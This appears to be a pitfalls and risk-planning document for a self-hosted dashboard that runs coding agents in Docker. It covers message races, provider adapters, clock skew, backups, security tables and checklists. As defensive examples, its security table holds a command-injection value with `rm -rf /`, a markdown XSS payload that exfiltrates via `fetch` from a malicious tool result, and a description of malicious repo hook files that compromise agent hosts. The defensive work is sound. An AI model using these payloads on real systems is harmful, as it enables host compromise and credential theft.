4. **Pin PixiJS to a release without the known v8 Graphics leak**, or replace Graphics with Sprite-on-RenderTexture for status circles.
5. **`app.ticker.maxFPS = 30`** on mobile when nothing is animating — saves battery and reduces sprite churn pressure.

**Severity:** MEDIUM
**Phase to address:** Phase: 2D Office UI
**References:**
- PixiJS v8 garbage collection docs
- pixijs issues #10533, #10586

---

### Pitfall 16: Race between Telegram sidecar and Web UI both talking to the same agent

**What goes wrong:**
User sends "fix the test" from Telegram. Sidecar dispatches `agents.send(agent_id=A, message="fix the test")`. Simultaneously, user opens the web UI on their laptop and types "add a comment" to the same agent. Both arrive at the backend within 50ms. Two `query()` calls hit the SDK on the same agent. SDK serializes them at best, or one wins and the other's response is lost at worst. Transcript order is scrambled. The Telegram user sees the comment-addition reply; the web user sees the test-fix reply.

This is the standard "single-conversation, multiple input channels" race. Slack, Discord bots, and command-line + IDE-extension hybrids all hit it.

**Detection:**
- Per-agent queue depth metric. If > 1 sustained, you have concurrent inputs.
- Transcript-out-of-order canary: insert sequence numbers in test runs and assert order.
- Audit log of message origin (`channel: "telegram" | "web" | "api"`) per turn.

**Prevention:**
1. **One queue per agent, FIFO.** Every input channel (web, Telegram, future API) pushes into the same queue; a single worker per agent drains it. No concurrent `query()` calls on a single agent.
2. **Explicit channel routing**: replies broadcast to all channels subscribed to that agent. Telegram user sees web messages too; web user sees Telegram messages too. Source-channel chip on each message.
3. **Optimistic UI with reconciliation**: web UI shows the user's input immediately, but with a "sending…" state; final ordering comes from the server's authoritative log.
4. **Idempotency keys** on send: if a phone client retries the same message (flaky network), the backend dedups.
5. **Lock per agent** in the worker: `agent.lock.acquire()` before the SDK call, release after. If a second request arrives during a session, it queues with a visible "waiting" indicator.

**Severity:** MEDIUM
**Phase to address:** Phase: Telegram Integration (the queue interface must exist before adding the second channel)

---

### Pitfall 17: Provider abstraction leaks (Claude tool-call shape ≠ OpenAI tool-call shape ≠ Gemini)

**What goes wrong:**
PROJECT.md spec requires "pluggable provider interface so Gemini, DeepSeek, Ollama can be added without rewrites." Easy to underspec: the first version is "shape it like Anthropic's `SDKMessage` and translate later." Three weeks in, OpenAI's `responses.create` stream comes in chunked-text-delta-then-tool-call shape, Gemini sends function-calling-with-explicit-finish-reason, and the "translation layer" is a 600-line `if (provider === 'openai') ...` mess. Adding Ollama requires touching every endpoint.

Specific shapes that diverge:
- Tool-call format: Anthropic's `tool_use` block vs. OpenAI's `tool_calls` array on a delta vs. Gemini's `functionCall` part.
- Streaming events: Anthropic's `content_block_delta`, OpenAI's `response.output_text.delta`, Gemini's chunked candidates.
- Usage reporting: Anthropic exposes cache-read tokens separately; OpenAI's `responses` API has different field names.
- Context window: model-specific, must be queried.

**Detection:**
- Provider-agnostic contract tests: every provider adapter must produce the same `OfficeMessage[]` for the same input. CI runs all adapters against a fixture.
- Static check: forbid `provider === '…'` strings outside the adapter layer (lint rule).
- Coverage: every adapter has a unit test for `streaming`, `tool_use`, `usage`, `error`, `session_resume`.

**Prevention:**
1. **Adapter pattern from day one** — even if MVP1 ships only Anthropic, the boundary exists. The core orchestrator speaks only `OfficeProvider` interface.
2. **Normalized event stream**: `{ type: 'text' | 'tool_call' | 'tool_result' | 'usage' | 'done' | 'error', ... }`. Each adapter is a translator into this shape.
3. **Per-provider feature flags**: explicit "supports_cache: bool", "supports_session_resume: bool" — UI degrades gracefully for providers that lack a feature.
4. **Reference adapter (Anthropic) is the cleanest**, but no core code calls the Anthropic SDK directly.
5. **Smoke test against each provider in CI** (with cheap minimal calls behind a `CI_LIVE_PROVIDERS` flag) to catch upstream API drift.

**Severity:** MEDIUM (architectural; cheap to do right early, expensive to fix later)
**Phase to address:** Phase: Agent Runtime / Provider Abstraction (must land with the first provider, not after the second)

---

### Pitfall 18: Time skew between host and agent containers breaks TLS, JWT, Let's Encrypt

**What goes wrong:**
Backend container clock drifts 5 minutes ahead. JWT `iat` is in the future from the client's perspective → token rejected. Or backend clock is 30 min behind → Let's Encrypt rejects the ACME nonce as too old; TLS certificate validation fails for legitimate certs because "notBefore" is in the future relative to the container's perception of now. Docker Desktop on Mac and WSL2 have documented clock-drift bugs on suspend/resume — a laptop closing the lid mid-session is enough to break the office until next NTP sync.

**Detection:**
- Health endpoint includes `server_time` (UTC ISO8601). Client compares vs. `Date.now()`; warn if skew > 30s.
- Backend logs a startup "clock check" against a public NTP source; alert if drift > 5s.
- JWT verify errors with `iat in future` or `exp in past` ratio above 0.1% = clock issue.

**Prevention:**
1. **Containers inherit host clock** (default with Docker), so the host's NTP is what matters — README says "ensure your host has NTP configured" prominently.
2. **JWT with `clockTolerance: 30`** (seconds) — `jose` and most libs support it. Don't be strict to the millisecond.
3. **Time-source for the agent containers**: bind-mount `/etc/localtime:/etc/localtime:ro` so timezone matches; rely on host clock for UTC.
4. **Reject if skew > 5 minutes**: backend refuses to issue tokens, surfaces "host clock is X minutes off, run `timedatectl` / restart NTP". Better than silent JWT failures.
5. **WSL2 drift workaround documented**: `sudo hwclock -s` on resume, or run a host-side NTP service.

**Severity:** MEDIUM
**Phase to address:** Phase: Foundation / Auth

---

### Pitfall 19: Inter-agent message bus scaffolded poorly — locks MVP1 into a bad interface

**What goes wrong:**
PROJECT.md commits to "scaffolded in MVP1, enabled in MVP2." The temptation: in-process `EventEmitter` to keep MVP1 simple. Then MVP2 needs cross-process (because Telegram sidecar, web backend, and agent runners are different processes), requires replacing the entire interface, and now every consumer is being rewritten just to support what should have been a feature flag.

Reverse temptation: jump to Redis pub/sub for "future-proofing" → adds an operational dependency before the message bus is even used.

**Detection:**
- API surface review: can a new consumer (e.g., the Telegram sidecar in Python) subscribe to events without modifying core code? If no, the interface is too coupled.
- Swap test: in tests, replace the in-process bus with Redis; if any code outside the bus module needs to change, the abstraction has leaked.

**Prevention:**
1. **Interface first**: define `MessageBus` with `publish(topic, payload)` and `subscribe(topic, handler)`. Both implementations conform.
2. **Use Redis from the start** — the compose stack already needs Redis for session/cache anyway (recommended for the Telegram polling lock and WebSocket session replay), so the marginal cost is zero.
3. **Don't expose Redis types** in the bus interface; payloads are plain JSON.
4. **Topic naming convention**: `agent.<id>.message`, `agent.<id>.status`, `agent.<id>.usage`. Documented in a single place.
5. **MVP1 humans publish; MVP2 agents publish** — same API, gated by a flag, not by code refactor.

**Severity:** MEDIUM (architectural debt; low blast radius if caught at scaffold time)
**Phase to address:** Phase: Inter-agent Bus scaffold

---

### Pitfall 20: "Single mountable volume" portability story breaks on cross-host UID/GID mismatch

**What goes wrong:**
User runs `docker compose down && tar -czf office.tar.gz volume/ && scp office.tar.gz newhost:/srv && ssh newhost "tar -xzf … && docker compose up -d"`. On the new host, the backend container runs as UID 1000, but the volume contents were owned by UID 1001 on the source host. Backend can't read its own database. Or worse: it can read but can't write the WAL file → SQLite errors out as read-only DB.

Same issue with SELinux contexts on RHEL-flavored hosts, with bind-mounted directories whose ownership doesn't match the in-container user, and with named volumes whose internal path differs across Docker versions.

**Detection:**
- Bootstrap script checks: `stat ${VOLUME}` against expected UID; if mismatch, chown or refuse to start with a clear error.
- Restore-from-tar smoke test in CI: tar the volume on host A, restore on host B with a different UID, verify backend starts.
- Backup verification step that's not just "tar produced a file" but "I can untar this and the backend starts."

**Prevention:**
1. **Backend runs as a known UID** (e.g. 1000), documented; tar with `--numeric-owner` preserves UIDs; on restore, an entry-point script chowns the volume to the expected UID if needed.
2. **Named Docker volume** (not bind mount) for portability: `docker volume create office-data`, and `docker run --rm -v office-data:/v -v $PWD:/backup alpine tar -czf /backup/office.tar.gz -C /v .` is the documented backup command.
3. **No SELinux-touching paths**: avoid bind-mounting host paths; volumes don't need `:z`/`:Z` labels.
4. **Document `--user` flag** explicitly in compose; allow overriding via `OFFICE_UID` env.
5. **Restore wizard** in the UI: "drop your tarball here, I'll re-chown and validate before unlocking."

**Severity:** MEDIUM (UX-breaking for the portability promise that is core to the project)
**Phase to address:** Phase: Foundation / Persistence + Phase: Backup/Restore tooling

---

## Technical Debt Patterns

Shortcuts that seem reasonable but create long-term problems.

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|----------|-------------------|----------------|-----------------|
| Mount `/var/run/docker.sock` directly into backend container | dockerode "just works" with zero config | Full host compromise on backend RCE; impossible to undo without breaking existing installs | **Never.** Use socket-proxy from day one. |
| Run agents on host (PTY fallback) for "Docker-less hosts" | Wider compatibility, slightly faster spawn | Bypasses entire security model; one CVE-2025-59536-class bug = host compromise | **Never.** PROJECT.md already decided this — keep the line. |
| Store secrets in plain SQLite, "encrypt later" | Faster MVP, no key management ceremony | Vault has to be rebuilt; old DB rows can't be retroactively secured; users who restored from backups still have plaintext | **Never.** Encryption from row 1. |
| Single shared API key for all agents | Simpler vault UI | Rate-limit and cost contagion across agents (Pitfall 4); no way to revoke compromise per-agent | MVP1 only, with prominent "one key per agent" upsell in UI |
| In-process EventEmitter as the message bus | No Redis dependency | Cross-process work later requires rewriting all subscribers | Acceptable if Redis is already in stack (it should be) |
| Polling-only Telegram bot | No webhook endpoint to configure | 409 conflicts, race conditions on restart, scaling pain | MVP1 only; document webhook upgrade path |
| Char-count token estimation | Easy to implement | Lies to user about context %; defeats the 70% red feature | **Never.** Use SDK-reported usage from day one. |
| Hardcoded model names in core | Fast to ship | Every model deprecation = code change; OpenAI / Gemini model lists are different | **Never.** Read from provider adapter. |
| Master key in env var only (no file) | Simplest possible config | User loses key on host migration → total data loss | **Never.** Print to file + stdout + QR. |
| Mounting host paths as agent workspaces (no copy) | Saves disk, no clone needed for local repos | Agent malicious file write touches user's actual repo; no isolation | Acceptable only with explicit "I trust this repo" user gesture and read-only mount option |
| SQLite WAL mode, hope for the best on networked storage | Out-of-the-box speed | Silent corruption on NFS / SMB volumes | Acceptable on local FS; refuse-to-run on networked FS |

---

## Integration Gotchas

| Integration | Common Mistake | Correct Approach |
|-------------|----------------|------------------|
| Claude Agent SDK | Assuming `~/.claude/projects/<cwd>` is stable across container recreates | Pin `CLAUDE_CONFIG_DIR` explicitly per agent; canonicalize cwd |
| Claude Agent SDK | Believing "session-id-only" is enough to resume | Resume requires matching cwd; verify both before calling |
| OpenAI Responses API | Treating streaming the same as Anthropic | Distinct event types (`response.output_text.delta` vs `content_block_delta`); separate adapter |
| Telegram Bot API | Polling and webhooks at the same time | Choose one; use `setWebhook("")` + `deleteWebhook(drop_pending_updates=true)` when switching |
| Telegram Bot API | Not handling `403 Forbidden: bot was blocked` | Mark chat as blocked, stop sending; don't retry |
| Docker Engine API | Calling `containers/create` with `HostConfig.Privileged` | Always `false`; use specific cap-add only when justified |
| Docker Engine API | Mounting `/` for "convenience" | Mount specific named volumes; reject any bind that resolves to `/`, `/proc`, `/sys`, `/etc`, `/var/run` |
| Let's Encrypt | Production ACME during local dev | Default to staging; `ZeroSSL` or Caddy `tls internal` for LAN |
| Caddy | Aggressive renewal window | Default settings; never < 7 days before expiry |
| Redis | Using `KEYS *` in production code | `SCAN` cursor-based iteration; `KEYS` blocks the server |
| SQLite (`better-sqlite3`) | Sharing a `Database` instance across threads | Per-thread / per-worker instance; pool via worker threads if needed |
| SQLite (`better-sqlite3`) | `journal_mode=WAL` on a networked volume | Detect FS type at boot; rollback journal on networked, WAL on local |
| PixiJS v8 | Creating new textures per render | Spritesheet + sprite pool; never `Texture.from()` in `requestAnimationFrame` |
| WebSocket (`@fastify/websocket`) | No heartbeat, trust the browser | 25s ping interval; close + reconnect on missed pongs |
| PWA (Service Worker) | Cache-first for `/api/*` | Network-first or no-cache for API; cache-first only for static |
| Sentry / telemetry | Sending request bodies | Strip everything except request shape; never include API keys or messages |
| pino / fastify-logger | Default `serializers` | Add redact paths; test with property fuzzing |

---

## Performance Traps

| Trap | Symptoms | Prevention | When It Breaks |
|------|----------|------------|----------------|
| Spawning Claude Code subprocess per turn | High latency on each agent message; memory churn | Long-lived SDK session per agent; `query()` reused | Already at 3+ active agents |
| Re-encoding `usage` JSON on every WS broadcast | Backend CPU spikes proportional to N agents × M clients | Compute once, fan out same buffer; use `ws.send(buffer)` not `JSON.stringify` per client | 10+ clients per agent |
| Storing every transcript line in SQLite | DB grows unbounded; queries slow over time | Transcripts to JSONL on disk; SQLite only for indexes/metadata | After a few weeks of heavy use |
| Synchronous `bcrypt.hash` in request handler | 100ms+ blocking per login | `bcrypt.compare`/`hash` async with cost 10-12 max | Multiple concurrent logins |
| `dockerode` `list({ all: true })` polling every 1s | API thrashes Docker daemon | Subscribe to Docker events via `getEvents`; pull state on event | 20+ containers |
| PixiJS `Graphics.beginFill / endFill` per frame | GPU memory creeps up; FPS drops on mobile | Use Sprites with pre-rendered textures; Graphics rarely redrawn | 1+ hour mobile sessions |
| Loading agent transcripts entirely on agent panel open | UI hangs on long-running agents (10K+ lines) | Paginated transcript fetch; virtualized list | Sessions older than ~1 day |
| WebSocket message rate without backpressure | Slow client → server memory growth | Client-side rate-limit; server-side `bufferedAmount` check + drop on backpressure | Mobile clients on 3G |
| Rebuilding the entire office sprite tree on agent add/remove | Visible frame skip; layout reflow | Diff + mutate; only changed sprites touched | 10+ agents |
| Reading large files into agent context (token blowup) | Context fills in 1 turn, $$ per request | Hard file-size limit at tool layer (e.g. 200KB); refuse to inline larger | First time someone says "read this 5MB log" |

---

## Security Mistakes

| Mistake | Risk | Prevention |
|---------|------|------------|
| Trusting `.claude/`, `.mcp.json`, `.cursor/`, `.devcontainer/` files from cloned repos | RCE on agent host (CVE-2025-59536), API key exfil (CVE-2026-21852) | Quarantine on clone; explicit user approval per hook; strict egress allowlist |
| Mounting `/var/run/docker.sock` in backend | Full host root via container escape (CVE-2025-9074 class) | Socket proxy with endpoint allowlist |
| Storing Telegram tokens unencrypted "for debugging" | Token theft = attacker drives your agent; agent writes your repos | AES-256-GCM encrypted in vault; hash for display only |
| Returning the API key to the browser to make "direct provider calls easier" | Key in browser DevTools, network tab, console errors | Key never leaves backend; provider calls always backend-proxied |
| Allowing agent containers to reach `169.254.169.254` (cloud metadata) | IAM credential theft on AWS / GCP / Azure | Egress block in agent network; reject this CIDR explicitly |
| Letting the agent run `git clone` with user-supplied URL via shell | Argument injection (`https://...; rm -rf /`) | Use `dockerode.exec` with array args, never shell strings; validate URL with strict parser |
| Caching ACME account key in the volume without encryption | Stolen volume = stolen ACME account → attacker can issue certs for your domains | Encrypt the ACME account key with the master key; restore wizard re-decrypts |
| Permissive CORS on the backend for "easier dev" | XSS-stealable session JWT | Same-origin only; strict CSRF tokens on mutating endpoints |
| Letting the user paste API keys into the agent's chat box | Key in transcript JSONL → backups → exfil | Detect key-shaped strings in inputs; refuse + warn |
| Storing `git config user.email` from the host into agent containers | Information leakage to repos that get pushed | Per-agent git identity, defaults to anonymous |
| No CSP on the PWA | XSS via a malicious agent response rendered in UI | Strict CSP: `default-src 'self'`, `connect-src 'self' wss://...`, no `'unsafe-inline'` |
| Markdown rendering of agent output without sanitization | `<img src=x onerror=fetch(...)>` exfil from a malicious tool result | Sanitize HTML; use a strict markdown renderer like `markdown-it` with HTML disabled |

---

## UX Pitfalls

| Pitfall | User Impact | Better Approach |
|---------|-------------|-----------------|
| Status colors that drift from reality (Pitfall 5 root cause) | User trusts "green" while agent is about to compact and lose context | Use SDK-reported context %; show a small "next compaction at X%" hint |
| Red status for both "context > 70%" AND "error" (per spec) | User can't tell which failure mode from a glance | Separate icons; red border = error, red center = context-full |
| Telegram-attached agent gives no visual feedback in web UI | User doesn't realize the phone command they sent is now driving the agent | Source-channel chip on every message; "live: 1 Telegram session" indicator on the desk |
| No confirmation when archiving an agent with unsaved work | Accidental loss of session, transcript, and uncommitted changes | Confirm dialog with "this agent has 12 uncommitted file changes" |
| Cost shown as raw USD only | $4.32 looks fine; user doesn't realize that's 4x normal | Compare to per-agent rolling average; alert on > 2x |
| "Add Agent" form requires choosing model, provider, key all up front | Friction; first-time user gives up | Sane defaults: cheapest current Sonnet, default key, scratch dir; "Customize" link for advanced |
| First-run admin password printed once and never shown again | User loses it, has to rebuild | Print 3 places (Pitfall 12); offer "reveal once more on first login" gate |
| Phone UI uses hover states for status info | Hover doesn't exist on touch; info is hidden | Long-press for details; tap for chat |
| No visible indicator when WebSocket is reconnecting | User types into a dead chat; messages drop | Sticky banner: "Reconnecting… your messages will send when reconnected" |
| Auto-refresh that nukes the user's in-progress chat | Lost typing on background tab refocus | Local draft cache; auto-restore |
| Agents listed alphabetically instead of by activity | "Busy/working" agents hidden behind sorting | Default sort: active > idle > paused > archived |

---

## "Looks Done But Isn't" Checklist

- [ ] **Agent containerization:** Often missing — egress allowlist (`iptables OUTPUT`), `cap_drop ALL`, `read_only: true`, `no-new-privileges`. Verify with: `docker inspect` → no privileged caps, no host-mounts beyond workspace.
- [ ] **Secrets vault:** Often missing — log redaction patterns, vault-locked-on-no-key-state, master key rotation flow. Verify with: grep recent logs for `sk-` / `[0-9]+:` patterns (should find none); rotate `MASTER_KEY` and confirm no data loss.
- [ ] **Session resume:** Often missing — cwd canonicalization, fail-loud on silent-new-session, model-deprecation detection. Verify with: rename agent workspace path, attempt resume, confirm error not silent new session.
- [ ] **Docker socket access:** Often missing — socket-proxy in compose, `DOCKER_HOST` env set. Verify with: from backend container, `curl --unix-socket /var/run/docker.sock` should fail; `curl http://socket-proxy:2375/containers/json` should succeed.
- [ ] **TLS / Caddy:** Often missing — staging-first ACME, LAN fallback to `tls internal`, HSTS off by default. Verify with: first boot on host with no public DNS → office still reachable.
- [ ] **Telegram bot lifecycle:** Often missing — single-poller lock in Redis, atomic agent switch, 409 detection + UI surfacing. Verify with: start two sidecar instances → second one detects lock and waits, doesn't dual-poll.
- [ ] **Auto-bootstrap:** Often missing — `INITIAL_SECRETS.txt` on volume, QR code on first login, reset-admin command. Verify with: `docker compose up -d` (detached), find creds after the fact.
- [ ] **Backup/restore:** Often missing — UID preservation, named-volume tar, restore wizard. Verify with: tar volume on host A, restore on host B with different UID → backend starts.
- [ ] **PWA cache invalidation:** Often missing — protocol-version header, skip-waiting handler, version-mismatch banner. Verify with: deploy backend v2; old SW phone sees banner, can update.
- [ ] **Mobile WebSocket:** Often missing — 25s heartbeat, visibility-change reconnect, sequence-replay. Verify with: real iPhone, lock screen 5 min, unlock → events resume without manual refresh.
- [ ] **PixiJS cleanup:** Often missing — `destroy({ texture: true })` on removed sprites, spritesheet (not per-sprite textures). Verify with: 1-hour soak test on mobile, GPU memory monitor stays flat.
- [ ] **Context % accuracy:** Often missing — SDK-reported `usage` used (not char count), `compact_boundary` subscribed. Verify with: long session, displayed % vs `usage.input_tokens / 200000` should match within 3 points.
- [ ] **Rate limit handling:** Often missing — per-agent budget, org-level circuit breaker, 429-aware shaping. Verify with: artificially low budget, agent stops cleanly with user-visible message.
- [ ] **Provider abstraction:** Often missing — adapter interface, no `provider===` outside adapter, contract tests. Verify with: lint rule fails if `'openai'` string appears in `src/core/`.
- [ ] **Clock skew handling:** Often missing — `clockTolerance` on JWT verify, `/healthz` server_time field, drift alert. Verify with: skew container clock by 1 minute, login still works.
- [ ] **Channel race:** Often missing — per-agent FIFO queue, source-channel chip in UI. Verify with: dual web + Telegram simultaneous send to same agent, transcript order is deterministic.

---

## Recovery Strategies

| Pitfall | Recovery Cost | Recovery Steps |
|---------|---------------|----------------|
| Malicious-repo RCE in agent container (Pitfall 1) | MEDIUM | Kill the container immediately (`docker rm -f`); audit egress logs for exfil destinations; rotate any keys the container had access to; scan workspace for backdoors; surface incident to user with full timeline |
| Docker socket exposure exploited (Pitfall 2) | HIGH | Treat host as compromised; rotate every secret; rebuild host; restore vault from last known clean backup (validated tar) |
| Key leaked in logs (Pitfall 3) | MEDIUM | Rotate at provider immediately; grep all volumes for the leaked prefix; redact and roll log archives; document incident |
| Rate-limit runaway already happened (Pitfall 4) | LOW | Pause all agents on the affected key; rotate to a fresh key if necessary; reset per-agent budgets to safer values; review what triggered the loop |
| Wrong context %, agent silently compacted (Pitfall 5) | LOW | Fix estimator, restart agent; transcripts intact; no data loss, only confusion |
| Session resume broken / lost (Pitfall 6) | MEDIUM | Open `~/.claude/projects/` directly; reconstruct from JSONL; create a new session pointing at the existing transcript; document the resume bug |
| SQLite corruption (Pitfall 7) | HIGH | Stop backend; `sqlite3 db .dump` (often recoverable); rebuild; restore from last clean backup if dump fails; investigate FS type and move off networked storage |
| ACME rate-limited (Pitfall 8) | LOW (time-based) | Switch to staging until limit resets (1 week for duplicate certs); use `tls internal` in the interim; document the renewal window |
| Telegram 409 conflict (Pitfall 9) | LOW | Kill duplicate poller; release Redis lock; restart sidecar; if token is suspected leaked, rotate via @BotFather |
| Telegram bot token theft (Pitfall 9, token leak) | HIGH | Revoke at @BotFather immediately; audit log review for unauthorized messages; check repos for unauthorized commits; rotate everything the bot could touch |
| Host OOM kills backend (Pitfall 10) | LOW | Scale down agents (archive less-used); raise host RAM; verify per-container limits are enforced |
| Master key lost (Pitfall 11) | HIGH | Vault data unrecoverable; user must re-add every provider key from each provider's console; document this in a brutally clear runbook |
| User can't find admin password (Pitfall 12) | LOW | `docker compose exec backend node reset-admin.js`; print new credentials |
| Mobile WS disconnect storm (Pitfall 13) | LOW | Backend sequence-replay logic resends missed events on reconnect; nothing to do manually |
| Stale PWA (Pitfall 14) | LOW | Show in-UI "update available" banner; user reloads; service worker self-replaces |
| PixiJS GPU OOM (Pitfall 15) | LOW | Reload page; investigate texture leaks; fix root cause |
| Two channels race wrote conflicting state (Pitfall 16) | LOW | Transcript is the source of truth (FIFO ordering); user reconciles manually; fix queue if it's a code bug |
| Provider abstraction leaked (Pitfall 17) | MEDIUM | Refactor to add adapter; touches many files; do incrementally with contract tests |
| Clock skew breaking JWT (Pitfall 18) | LOW | Re-sync host NTP; widen `clockTolerance`; investigate suspend/resume cycle |
| Volume tar restore breaks on new host (Pitfall 20) | LOW | Bootstrap script chowns the volume; restore wizard handles it; document fallback `chown -R 1000:1000 /vol` |

---

## Pitfall-to-Phase Mapping

| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| #1 Malicious-repo RCE | **Phase: Agent Runtime / Sandbox** | Test repo with `.claude/hooks` runs → blocked at quarantine; agent egress to unallowed host → blocked by iptables |
| #2 Docker socket exposure | **Phase: Foundation / Compose stack** | Backend can't stat `/var/run/docker.sock`; only socket-proxy endpoints allowed |
| #3 API key leakage | **Phase: Secrets Vault** | Property-fuzz logs with key-shaped strings → 0 matches; transcripts never contain keys |
| #4 Rate-limit / cost runaway | **Phase: Agent Runtime + 2D Office UI** | Synthetic loop-test halts at budget; 429 response → graceful backoff, not retry-storm |
| #5 Context % inaccuracy | **Phase: Agent Runtime + 2D Office UI** | Displayed % within 3 points of `usage.input_tokens / window` across 100-turn fixture |
| #6 Session resume edge cases | **Phase: Agent Runtime** | Move workspace path → resume errors loudly; delete cwd mid-session → user-visible recovery flow |
| #7 SQLite on networked storage | **Phase: Foundation / Persistence** | Boot on NFS mount → refuse-to-start with clear message; integrity_check nightly clean |
| #8 ACME edge cases | **Phase: Foundation / Reverse proxy** | First boot with no public DNS → office reachable via `tls internal`; staging-first by default |
| #9 Telegram bot lifecycle | **Phase: Telegram Integration** | Dual sidecar start → second waits on Redis lock; webhook + polling collision → detected at startup |
| #10 Memory exhaustion | **Phase: Agent Runtime** | Spawn N agents until host limit → admission control rejects N+1 instead of OOM-killing backend |
| #11 Master key recoverability | **Phase: Secrets Vault** | Rotate master key → no data loss; restore vault on new host with key → success; without key → clear locked-vault error |
| #12 Bootstrap secret invisibility | **Phase: Foundation / Bootstrap** | Detached up + 90s later → can recover password from volume file; reset-admin command works |
| #13 Mobile WS disconnects | **Phase: 2D Office UI + Backend API** | Real-iPhone lock-5min-unlock test → events catch up via sequence replay |
| #14 PWA stale cache | **Phase: 2D Office UI / PWA** | Deploy v2 backend → v1 PWA shows update banner, doesn't 400 silently |
| #15 PixiJS memory leak | **Phase: 2D Office UI** | 1-hour mobile soak with status flips → GPU memory flat ±10% |
| #16 Channel race | **Phase: Telegram Integration** | Simultaneous web + Telegram send → transcript order deterministic; source chip visible |
| #17 Provider abstraction leak | **Phase: Agent Runtime / Provider Abstraction** | Lint rule for `provider===` outside adapter passes; adapter contract tests pass for each provider |
| #18 Clock skew | **Phase: Foundation / Auth** | Skew container 1 min → login works; skew 6 min → clear "host clock off" error |
| #19 Bus interface design | **Phase: Inter-agent Bus scaffold** | Swap in-process bus for Redis with no consumer changes |
| #20 Volume portability | **Phase: Foundation / Persistence + Backup tooling** | Tar on host A (UID 1000) → restore on host B (UID 1001) → backend starts |

---

## Top 10 "Must Address in MVP1" — Ranked by Severity × Likelihood

1. **#1 Malicious-repo RCE via `.claude/`, `.mcp.json`, hooks** — CRITICAL × NEAR-CERTAIN
   Anyone who clones a real-world repo touches this. CVE-2025-59536 and CVE-2026-21852 are public; attackers know the surface. Containerization + egress allowlist + config quarantine are the line that cannot be moved.

2. **#2 Docker socket exposure in backend** — CRITICAL × HIGH
   The default-easy path leads here. Backend RCE → host root. Socket proxy from day one. CVE-2025-9074 (CVSS 9.3) is a recent reminder this class is being actively exploited.

3. **#3 API key / Telegram token leakage in logs and transcripts** — CRITICAL × HIGH
   Pino's default config logs Authorization headers. Telegram tokens hardcoded in malware (Picus/SC Media incidents) and exfiltrated from logs are routine. The May 11 2026 SIGMA-bot $200K drain proves the cost.

4. **#4 Rate-limit and cost runaway** — CRITICAL × HIGH (especially for users on shared API tiers)
   A loop on one agent + a shared key = the user wakes up to a $400 bill. Per-agent budget + circuit breaker before any agent is real.

5. **#11 Master key recoverability** — HIGH × MEDIUM
   The first user who loses their volume tar without the master key loses everything. Two-layer key model + three-place first-run printout.

6. **#10 Memory exhaustion on small VPS** — HIGH × HIGH
   Per-container limits + admission control. Without these, the first user to spin up 6 agents on a 4 GB VPS gets the office OOM-killed.

7. **#7 SQLite on networked storage** — HIGH × MEDIUM
   The portability story attracts Synology/Unraid users who will absolutely mount the volume on NFS. Boot-time FS-type check + clear refusal is cheap insurance.

8. **#6 Session resume edge cases** — HIGH × HIGH
   Agent lifecycle requires reliable resume. The cwd-mismatch silent-new-session bug ([#555](https://github.com/anthropics/claude-agent-sdk-python/issues/555)) burns trust immediately on the first restart.

9. **#13 Mobile WebSocket disconnects** — HIGH × NEAR-CERTAIN on phone-first UI
   "Phone-first" is core. Without heartbeat + visibility-change + sequence-replay, the PWA appears broken every time the user locks their phone.

10. **#9 Telegram bot lifecycle (409 + token security)** — HIGH × HIGH for the Telegram-using subset
    Telegram is a top-line MVP1 feature. 409 conflicts on every dev restart, token theft scenarios (PupkinStealer pattern), and dual-channel race conditions (#16) all converge here.

**Adjacent runner-up: #5 Context % accuracy** — without it, the centerpiece "red dot at 70%" UI lies to the user, undermining the core dashboard value prop.

---

## Sources

### CVEs and incident reports
- [Check Point Research — "Caught in the Hook: RCE and API Token Exfiltration Through Claude Code Project Files" (CVE-2025-59536, CVE-2026-21852)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
- [GitHub Advisory GHSA-jh7p-qr78-84p7 — CVE-2026-21852](https://github.com/advisories/GHSA-jh7p-qr78-84p7)
- [SentinelOne — CVE-2025-59536 Anthropic Claude Code RCE](https://www.sentinelone.com/vulnerability-database/cve-2025-59536/)
- [SentinelOne — CVE-2025-9074 Docker Desktop Privilege Escalation](https://www.sentinelone.com/vulnerability-database/cve-2025-9074/)
- [SOC Prime — CVE-2025-9074 Docker Desktop Vulnerability](https://socprime.com/blog/cve-2025-9074-docker-desktop-vulnerability/)
- [The Register — Claude Code collaboration tools allowed RCE](https://www.theregister.com/2026/02/26/clade_code_cves/)
- [The Hacker News — Claude Code Flaws Allow RCE and API Key Exfiltration](https://thehackernews.com/2026/02/claude-code-flaws-allow-remote-code.html)
- [MintMCP — Claude Code CVE-2025-59536 & CVE-2026-21852: Enterprise Teams](https://www.mintmcp.com/blog/claude-code-cve)
- [Cyfirma — Raven Stealer Telegram-Based Data Exfiltration](https://www.cyfirma.com/research/raven-stealer-unmasked-telegram-based-data-exfiltration/)
- [Picus Security — PupkinStealer .NET Infostealer Using Telegram](https://www.picussecurity.com/resource/blog/pupkinstealer-net-infostealer-using-telegram-for-data-theft)
- [SC Media — Hackers leak operations through exposed Telegram Bot API tokens](https://www.scworld.com/news/hackers-leak-their-own-operations-through-exposed-telegram-bot-api-tokens)
- [Cryptotimes — Crypto Trader Drained of $200K via Telegram Bot (May 11, 2026)](https://www.cryptotimes.io/2026/05/11/crypto-trader-drained-of-200k-in-telegram-bot-linked-crypto-hack/)
- [Let's Encrypt Outage Postmortem (Mar 12, 2026)](https://johal.in/postmortem-lets-encrypt-rate-limit-prevented-certificate-renewal/)
- [GitGuardian — Remediating Telegram Bot Token Leaks](https://www.gitguardian.com/remediation/telegram-bot-token)

### Vendor docs and authoritative sources
- [Anthropic API Rate Limits](https://docs.anthropic.com/en/api/rate-limits)
- [Anthropic — Our approach to API rate limits](https://support.anthropic.com/en/articles/8243635-our-approach-to-api-rate-limits)
- [Claude API — Context Windows](https://platform.claude.com/docs/en/build-with-claude/context-windows)
- [Claude API — Compaction](https://platform.claude.com/docs/en/build-with-claude/compaction)
- [Claude Agent SDK — Sessions](https://platform.claude.com/docs/en/agent-sdk/sessions)
- [Claude Code Troubleshooting](https://code.claude.com/docs/en/troubleshooting)
- [Let's Encrypt Rate Limits](https://letsencrypt.org/docs/rate-limits/)
- [Let's Encrypt Staging Environment](https://letsencrypt.org/docs/staging-environment/)
- [SQLite "How To Corrupt An SQLite Database File"](https://sqlite.org/howtocorrupt.html)
- [SQLite WAL mode](https://sqlite.org/wal.html)
- [SQLite Forum — How exactly does corruption happen during WAL checkpoint](https://sqlite.org/forum/info/47107ab818977549?t=h)
